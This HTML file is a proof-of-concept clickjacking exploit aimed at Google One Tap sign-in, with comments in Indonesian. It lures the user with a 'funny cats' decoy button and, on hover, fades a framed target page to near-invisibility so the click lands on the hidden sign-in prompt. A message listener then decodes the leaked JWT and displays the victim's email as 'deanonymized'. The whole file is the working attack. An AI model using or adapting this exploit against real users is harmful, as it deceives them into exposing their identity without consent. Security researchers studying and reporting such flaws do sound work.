<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking PoC</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="p-4">
    <h1>Google One Tap Clickjacking PoC</h1>
    <p>Status: <span id="status" class="badge bg-warning">Hover me to start</span></p>

    <iframe id="target-frame" src="target.html" onmouseover="attack()" 
            style="border: 1px solid black; width: 400px; height: 200px; opacity: 1;"></iframe>

<button class="btn btn-primary" id="trap-btn" 
        style="position: absolute; top: 125px; right: 280px; z-index: 10; opacity: 0.5;">
    Click me to see funny cats 🐱
</button>

<script>
    function attack() {
        document.getElementById("status").innerText = "Attacking...";
        const frame = document.getElementById("target-frame");
        
        // Saat mouse hover, buat iframe transparan agar terlihat seperti 
        // tombol 'Funny Cats' yang diklik, padahal yang kena adalah akun Google
        [300, 400, 500].forEach(ms => {
            setTimeout(() => {
                // Opacity rendah agar iframe 'hilang' secara visual
                frame.style.opacity = '0.01'; 
                console.log("Opacity reduced at " + ms + "ms");
            }, ms);
        });
    }

    // Listener untuk menangkap data JWT yang bocor
    window.onmessage = (e) => {
        if (e.data && e.data.credential) {
            const payload = JSON.parse(atob(e.data.credential.split('.')[1]));
            document.getElementById('res').innerHTML = 
                `<div class="alert alert-success">Berhasil Deanonymized: ${payload.email}</div>`;
        }
    };
</script>
</body>
</html>
